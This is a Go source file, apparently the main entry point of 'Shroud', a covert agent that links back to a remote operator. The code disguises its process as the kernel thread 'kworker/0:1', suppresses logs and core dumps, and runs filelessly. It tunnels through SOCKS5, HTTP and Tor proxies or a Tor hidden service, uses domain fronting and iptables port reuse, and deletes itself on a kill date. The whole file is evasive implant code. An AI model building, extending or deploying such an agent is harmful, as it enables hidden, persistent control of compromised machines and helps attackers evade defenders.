package main

import (
	"io"
	"log"
	"net"
	"os"
	"runtime"
	"strings"

	"Shroud/agent/initial"
	"Shroud/agent/process"
	"Shroud/global"
	"Shroud/identity"
	"Shroud/protocol"
	"Shroud/share"
	"Shroud/utils"
)

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func main() {
	utils.DisableCoreDump()
	options := initial.ParseOptions()
	utils.MaskProcessName("kworker/0:1")
	if !options.Verbose {
		log.SetOutput(io.Discard)
	}

	if options.Fileless {
		identity.SetFilelessMode(true)
		identity.SetAllowPlaintextIdentity(true)
		utils.FilelessHarden()
	} else if options.IdentityPlain {
		identity.SetAllowPlaintextIdentity(true)
	}
	share.GeneratePreAuthToken(options.Secret)
	share.InitGreetings(options.Secret)
	if len(options.Secret) > 0 {
		identity.SetStorageSecret(options.Secret)
	}
	passphrase := options.Passphrase
	if passphrase == "" {
		passphrase = os.Getenv("SHROUD_PASSPHRASE")
		os.Unsetenv("SHROUD_PASSPHRASE")
	}
	if passphrase != "" {
		identity.SetStorePassphrase([]byte(passphrase))
	}
	agentIDPath := ""
	if options.IdentityDir != "" {
		agentIDPath = options.IdentityDir + string(os.PathSeparator) + "agent_identity.json"
	}
	agentID, err := identity.LoadOrCreateAgent(agentIDPath)
	if err != nil {
		log.Fatalf("Failed to initialize agent identity: %v", err)
	}
	if agentID.AdminUUID != "" {
		protocol.SetAdminUUID(agentID.AdminUUID)
	}
	if len(share.AuthKey) > 0 {
		protocol.SetTempUUID(utils.DeriveUUID(share.AuthKey, "temp-uuid"))
	}
	if options.Magic == "" {
		if len(agentID.ProtocolMagic) == 4 {
			_ = share.SetMagic(agentID.ProtocolMagic)
		} else if len(share.AuthKey) != 0 {
			magic, _ := share.FingerprintFromAuthKey(share.AuthKey)
			_ = share.SetMagic(magic)
		} else {
			log.Fatal("Missing enrollment secret or stored protocol magic; provide -s/SHROUD_SECRET for first run")
		}
	} else {
		_ = agentID.SetProtocolFingerprint(share.Magic(), "")
	}
	if options.WSPath == "" {
		if agentID.WebSocketPath != "" {
			_ = protocol.SetWebSocketPath(agentID.WebSocketPath)
		} else if len(share.AuthKey) != 0 {
			_, wsPath := share.FingerprintFromAuthKey(share.AuthKey)
			_ = protocol.SetWebSocketPath(wsPath)
		} else {
			log.Fatal("Missing enrollment secret or stored WebSocket path; provide -s/SHROUD_SECRET for first run")
		}
	} else {
		_ = agentID.SetProtocolFingerprint(nil, protocol.WebSocketPath())
	}
	cryptoKey := []byte(nil)
	share.SetProxyStreamFunc(initial.ProxyStream)

	agent := process.NewAgent(options)

	if options.PadSize > 0 {
		if err := protocol.SetPadSize(options.PadSize); err != nil {
			log.Fatalf("[*] Invalid pad size: %s\n", err.Error())
		}
	}
	if options.UserAgent != "" {
		protocol.SetUserAgents(strings.Split(options.UserAgent, "|"))
	}
	if options.FrontDomain != "" {
		protocol.SetFrontDomain(options.FrontDomain)
	}
	if options.Origin != "" {
		protocol.SetOrigin(options.Origin)
	}

	protocol.SetUpDownStream(options.Upstream, options.Downstream)

	var (
		conn    net.Conn
		linkKey []byte
	)
	switch options.Mode {
	case initial.NORMAL_PASSIVE:
		conn, agent.UUID, linkKey = initial.NormalPassive(options, cryptoKey, agentID)
	case initial.NORMAL_RECONNECT_ACTIVE:
		fallthrough
	case initial.NORMAL_ACTIVE:
		conn, agent.UUID, linkKey = initial.NormalActive(options, cryptoKey, nil, agentID)
	case initial.SOCKS5_PROXY_RECONNECT_ACTIVE:
		fallthrough
	case initial.SOCKS5_PROXY_ACTIVE:
		proxy := share.NewSocks5Proxy(options.Connect, options.Socks5Proxy, options.Socks5ProxyU, options.Socks5ProxyP)
		conn, agent.UUID, linkKey = initial.NormalActive(options, cryptoKey, proxy, agentID)
	case initial.HTTP_PROXY_RECONNECT_ACTIVE:
		fallthrough
	case initial.HTTP_PROXY_ACTIVE:
		proxy := share.NewHTTPProxy(options.Connect, options.HttpProxy)
		conn, agent.UUID, linkKey = initial.NormalActive(options, cryptoKey, proxy, agentID)
	case initial.TOR_PROXY_RECONNECT_ACTIVE:
		fallthrough
	case initial.TOR_PROXY_ACTIVE:
		proxy := share.NewTorProxy(options.Connect, options.TorProxy)
		conn, agent.UUID, linkKey = initial.NormalActive(options, cryptoKey, proxy, agentID)
	case initial.TOR_HIDDEN_PASSIVE:
		conn, agent.UUID, linkKey = initial.TorHiddenPassive(options, cryptoKey, agentID)
	case initial.IPTABLES_REUSE_PASSIVE:
		defer initial.DeletePortReuseRules(options.Listen, options.ReusePort)
		conn, agent.UUID, linkKey = initial.IPTableReusePassive(options, cryptoKey, agentID)
	case initial.SO_REUSE_PASSIVE:
		conn, agent.UUID, linkKey = initial.SoReusePassive(options, cryptoKey, agentID)
	default:
		log.Fatal("[*] Unknown Mode")
	}

	for i := range options.Secret {
		options.Secret[i] = 0
	}
	share.ClearPreAuthToken()

	global.InitialGComponent(conn, cryptoKey, agent.UUID)
	global.Session.SetLinkKey(linkKey)
	_ = utils.MlockBytes(global.Session.GetLinkKey())
	global.Session.TLSEnable = options.TlsEnable
	global.Session.TLSFingerprint = options.TlsFingerprint
	global.Session.TLSInsecure = options.TlsInsecure
	global.Session.TorProxy = options.TorProxy
	global.SetAgentIdentity(agentID)
	protocol.SetSecurityContext(func(peer string) []byte { return agentID.PayloadKeyForAdmin() }, nil, agentID)

	process.SelfDeleteOnExit = options.SelfDelete

	if options.KillDate != "" || options.WorkHours != "" {
		killDate, _ := process.ParseKillDate(options.KillDate)
		go process.StartLifecycleMonitor(killDate, options.WorkHours, options.SelfDelete)
	}

	agent.Run()
}
